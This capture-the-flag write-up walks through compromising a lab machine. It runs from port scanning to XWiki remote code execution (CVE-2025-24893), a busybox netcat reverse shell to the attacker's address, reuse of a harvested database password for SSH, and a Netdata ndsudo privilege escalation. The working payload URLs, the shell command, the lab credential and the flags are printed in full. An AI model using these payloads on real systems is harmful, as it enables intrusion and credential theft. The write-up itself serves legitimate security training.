# CTF Writeup: Editor CTF

## Lab Description

**none**

---

## Reconaissance

An initial scan reveals the following information abt which services are running on the target and detailled information.

```
nmap -n -Pn -sSCV -p- --min-rate 10000 10.129.231.23
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 12:33 EDT
Nmap scan report for 10.129.231.23
Host is up (0.037s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.231.23:8080/xwiki/bin/view/Main/
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Jetty(10.0.20)
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-server-header: Jetty(10.0.20)
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.27 seconds
```

Since we can analyze from the output, that http wants to redirect us to http://editor.htb/ but it didn't work I mapped this domain to our target ip 10.129.231.23 in our local /etc/hosts file.

```
sudo echo "10.129.231.23 editor.htb" | sudo tee -a /etc/hosts
```

Analyzing the http webpage, when clicking on the "Docs" tab, we get forwarded to an subdomain called wiki.editor.htb, but we our browser can't resolve this domain to an ip address. Let's map it to our /etc/hosts asw, so it can resolve it!

```
nano /etc/hosts
10.129.231.23 editor.htb wiki.editor.htb
```

Analyzed the webpage and retrieved xWiki Debian 15.10.8 Version, googled for exploits and ran searchsploit

```
searchsploit xWiki
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
XWiki 14 - SQL Injection via getdeleteddocuments.vm                       | multiple/webapps/52384.c
XWiki 4.2-milestone-2 - Multiple Persistent Cross-Site Scripting Vulnerab | php/webapps/20856.txt
Xwiki CMS 12.10.2 - Cross Site Scripting (XSS)                            | multiple/webapps/49437.txt
XWiki Platform 15.10.10 - Metasploit Module for Remote Code Execution (RC | multiple/webapps/52429.txt
XWiki Platform 15.10.10 - Remote Code Execution                           | multiple/webapps/52136.txt
XWiki Standard 14.10 - Remote Code Execution (RCE)                        | php/webapps/52105.py
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Found CVE-2025-24893 and tried using it, but didn't work.

```
python3 CVE-2025-24893.py
================================================================================
Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution
Made By Al Baradi Joy
================================================================================
[?] Enter the target URL (without http/https): wiki.editor.htb/xwiki/bin/view/Main
[!] HTTPS not available, falling back to HTTP.
[✔] Target supports HTTP: http://wiki.editor.htb/xwiki/bin/view/Main
[+] Sending request to: http://wiki.editor.htb/xwiki/bin/view/Main/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
[✖] Exploit failed. Status code: 404
```

Moved on scanning the actual domain and the retrieved subdomain using dirsearch.

Found an interesting endpoint called /xwiki/authenticate which faced an internal error. Let's capture this package and analyze it further.

```
dirsearch -u http://wiki.editor.htb/xwiki       
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_wiki.editor.htb/_xwiki_25-10-15_12-44-13.txt

Target: http://wiki.editor.htb/

[12:44:13] Starting: xwiki/
[12:44:31] 302 -    0B  - /xwiki/%2e%2e;/test  ->  http://wiki.editor.htb/xwiki/%2E%2E/xwiki;/
[12:44:31] 302 -    0B  - /xwiki/%2e%2e//google.com  ->  http://wiki.editor.htb/xwiki/%2E%2E//xwiki
[12:44:40] 302 -    0B  - /xwiki/..;/  ->  http://wiki.editor.htb/xwiki;/   
[12:44:42] 404 -   16KB - /xwiki/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
[12:44:47] 404 -   16KB - /xwiki/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
[12:47:44] 404 -   15KB - /xwiki/.settings/rules.json?auth=FIREBASE_SECRET  
[12:48:21] 404 -   15KB - /xwiki/show_image_NpAdvCatPG.php?cache=false&cat=1&filename=
[12:48:55] 200 -    0B  - /xwiki/;admin/                                    
[12:48:55] 200 -    0B  - /xwiki/;json/                                     
[12:48:55] 200 -    0B  - /xwiki/;login/
[12:49:19] 404 -   15KB - /xwiki/_vti_bin/shtml.exe?_vti_rpc                
[12:50:01] 404 -   15KB - /xwiki/AdaptCMS/admin.php?view=/&view=levels      
[12:50:01] 404 -   15KB - /xwiki/AdaptCMS/admin.php?view=/&view=settings    
[12:50:05] 404 -   15KB - /xwiki/AdaptCMS/admin.php?view=/&view=stats       
[12:50:47] 404 -   15KB - /xwiki/admin/portalcollect.php?f=http://xxx&t=js  
[12:53:17] 404 -   15KB - /xwiki/ADSearch.cc?methodToCall=search            
[12:53:23] 404 -   15KB - /xwiki/analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd
[12:53:41] 404 -   15KB - /xwiki/application.wadl?detail=true               
[12:53:56] 500 -    9KB - /xwiki/authenticate
```

Didn't find anything.

## Initial Access


Went back to the original path and tried out a different PoC regarding CVE-2025-24893.
This one worked out for me:

```
https://github.com/gunzf0x/CVE-2025-24893/blob/main/CVE-2025-24893.py
```

Prompt the following command to gain initial access.


```
python3 CVE-2025-24893.py -t http://editor.htb:8080/ -c 'busybox nc 10.10.14.191 1337 -e /bin/bash' 
[*] Attacking http://editor.htb:8080/
[*] Injecting the payload:
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.14.191%201337%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D                                                                                           
[*] Command executed

~Happy Hacking 
```

Before executing the script I started up my nc listener.

```
nc -lvnp 1337
```

Gained shell as user "xwiki"

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.191] from (UNKNOWN) [10.129.231.23] 45022
ls
jetty
logs
start.d
start_xwiki.bat
start_xwiki_debug.bat
start_xwiki_debug.sh
start_xwiki.sh
stop_xwiki.bat
stop_xwiki.sh
webapps
whoami
xwiki
```

Let's harden our shell.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Following users exist on the server. We will most likely have to perform lateral movement to root.

```
xwiki@editor:/usr/lib/xwiki-jetty$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```

## Privilege Escalation

Asked the LLM where database passwords are stored in xWiki. Retrieved password in /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml

```
xwiki@editor:/usr/lib/xwiki/WEB-INF$ cat hibernate.cfg.xml | grep password
cat hibernate.cfg.xml | grep password
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>

```

Logged into ssh with oliver:theEd1t0rTeam99


```
ssh oliver@editor.htb          
The authenticity of host 'editor.htb (10.129.231.23)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'editor.htb' (ED25519) to the list of known hosts.
oliver@editor.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Oct 15 05:42:27 PM UTC 2025

  System load:  0.56              Processes:             230
  Usage of /:   65.1% of 7.28GB   Users logged in:       0
  Memory usage: 64%               IPv4 address for eth0: 10.129.231.23
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

4 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Oct 15 17:42:28 2025 from 10.10.14.191
oliver@editor:~$
```

Retrieved user.txt in/home/oliver


```
cf44f0fa3ed47ef948e1ee7cf3db1bc0
```

Checking for exploitable SUID Binarys.

```
oliver@editor:/$ find / -perm /4000 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

ndsudo looks interesting, let's check google for any exploits.

Found this one:

```
https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC
```

Downloaded both the .sh script and the .c script to my local machine.
It's important to compile the .c script, for this u need to prompt the following command:

```
gcc -static payload.c -o nvme -Wall -Werror -Wpedantic
```

Downloaded the files to the target server. For this we need to create our own python webserver.
Note: It has to be in the directory in which the files are getting stored, otherwise u need to prompt the absolute path.

```
python3 -m http.server 80
```

Executed the .sh script and retrieved root rights on the target server.

```
oliver@editor:/tmp$ sh CVE-2024-32019.sh 
[+] ndsudo found at: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
[+] File 'nvme' found in the current directory.
[+] Execution permissions granted to ./nvme
[+] Running ndsudo with modified PATH:
root@editor:/tmp# 
```

Retrieved root.txt in /root directory.


```
f944b96e36261d50e2fb25ffdd797d25
```
